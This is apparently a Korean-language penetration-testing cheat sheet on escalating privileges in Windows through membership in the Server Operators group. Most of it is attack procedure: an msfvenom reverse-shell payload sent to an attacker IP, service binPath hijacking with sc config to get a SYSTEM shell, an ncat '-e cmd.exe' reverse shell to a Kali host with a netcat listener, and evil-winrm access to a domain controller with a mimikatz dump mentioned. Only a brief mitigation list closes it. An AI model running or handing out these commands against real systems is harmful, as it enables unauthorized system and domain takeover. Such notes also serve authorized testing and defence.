

# Server Operators 그룹을 이용한 권한 상승 가이드

`Server Operators`는 서버의 운영 및 관리를 위해 설계된 그룹으로, 멤버들은 서비스를 시작 및 중지하고, 백업 및 복원을 수행하며, 서버에 원격으로 로그인할 수 있는 등 강력한 권한을 가집니다. 이 권한들은 권한 상승의 경로로 악용될 수 있습니다.

https://www.hackingarticles.in/windows-privilege-escalation-server-operator-group/

---

### **1. 취약점 식별**

- **목표:** 현재 사용자가 `Server Operators` 그룹의 멤버인지 확인합니다.

```powershell(title="사용자 그룹 멤버십 확인")
whoami /groups
```

- **확인 사항:** 출력된 목록에서 `Server Operators` 그룹이 포함되어 있는지 확인합니다.

---

### **2. 공격 벡터**

#### **벡터 A: 서비스 제어를 통한 권한 상승**

- **원리:** `Server Operators`는 서비스를 시작하고 중지할 권한이 있습니다. 만약 이 그룹이 특정 서비스의 실행 파일(`binPath`)을 수정할 권한(`SERVICE_CHANGE_CONFIG`)까지 가지고 있다면, 해당 서비스의 실행 파일을 악성 페이로드로 교체하고 서비스를 재시작하여 `SYSTEM` 권한을 획득할 수 있습니다.

- **단계별 공격 절차:**
  1.  **권한 확인:** `accesschk.exe` 등으로 `Server Operators` 그룹이 수정 가능한 서비스를 찾습니다.
  2.  **페이로드 생성 및 업로드:** `msfvenom`으로 리버스 셸 `exe` 파일을 생성하여 서버에 업로드합니다.
  ```powershell
msfvenom -p windows/x64/shell/reverse_tcp lhost=192.168.1.205 lport=443 -f exe > shell.exe
      ```
  4.  **서비스 경로 변경:** `sc config` 명령어로 취약한 서비스의 `binPath`를 악성 페이로드의 경로로 변경합니다.
      ```powershell
      sc config <vulnerable_service> binPath= "C:\Temp\revshell.exe"
      ```
  5.  **서비스 재시작:** `sc stop` 및 `sc start` 명령어로 서비스를 재시작하여 페이로드를 실행시키고, 공격자 리스너에서 `SYSTEM` 셸을 획득합니다.
      ```powershell
      sc stop <vulnerable_service>
      sc start <vulnerable_service>
      ```

#### **벡터 B: 도메인 컨트롤러(DC) 원격 접속 (더 치명적)**

- **원리:** 기본적으로 `Server Operators` 그룹은 **도메인 컨트롤러에 원격으로 로그인할 수 있는 권한**을 가집니다. 이는 매우 큰 보안 위협으로, 공격자가 DC에 직접 접속하여 추가적인 권한 상승 공격(예: `mimikatz`를 이용한 메모리 덤프)을 수행할 발판을 마련해주기 때문입니다.

- **공격 절차:**
  1.  `Server Operators` 그룹에 속한 사용자의 자격증명을 획득합니다.
  2.  해당 자격증명을 사용하여 `evil-winrm`이나 `xfreerdp` 등으로 도메인 컨트롤러에 직접 원격 접속을 시도합니다.
      ```bash(title="evil-winrm을 이용한 DC 접속")
      evil-winrm -i <DC_IP> -u <server_operator_user> -p <password>
      ```
  3.  DC에 접속한 후, 추가적인 내부 정찰 및 권한 상승 공격을 수행하여 최종적으로 도메인 관리자 권한을 획득합니다.

---
### **3. 공격 절차**

- 이 그룹에 속해 있다면, `services`를 실행
- 수정할 수 있는 서비스들과 해당 서비스의 실행 파일(binary) 경로를 보여줌
- 리버스 쉘(revshell)을 생성한 후, 서비스의 실행 파일을 리버스 쉘로 교체


```powershell title="Windows"
services
sc.exe config VMTools binPath= "C:\Users\aarti\Documents\shell.exe"
sc.exe stop VMTools
sc.exe start VMTools
```

```powershell title="ncat reverse (Windows)"
sc.exe config AWSLiteAgent binPath= "C:\Windows\tasks\ncat.exe -e cmd.exe [kali_ip] 443"
```

```bash title="ncat reverse (Kali)"
nc -lvnp 443
```

---

### **4. 방어 (Mitigation)**

- **멤버십 최소화:** `Server Operators` 그룹의 멤버십을 엄격하게 제한하고, 일상적인 관리 작업에는 사용하지 않도록 합니다.
- **권한 감사:** 그룹 정책(GPO)을 통해 `Server Operators`의 DC 원격 로그온 권한을 제한하거나 제거하는 것을 고려합니다.
- **서비스 ACL 감사:** 각 서비스의 접근 제어 목록(ACL)을 정기적으로 검토하여 비정상적인 권한 할당이 없는지 확인합니다.

